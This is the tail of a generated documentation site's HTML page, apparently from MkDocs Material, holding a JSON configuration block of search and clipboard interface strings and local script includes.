    <script id="__config" type="application/json">{"base": "../../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.b6ff8c07.min.js"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.5e13d264.min.js"></script>
      
    
  </body>
</html>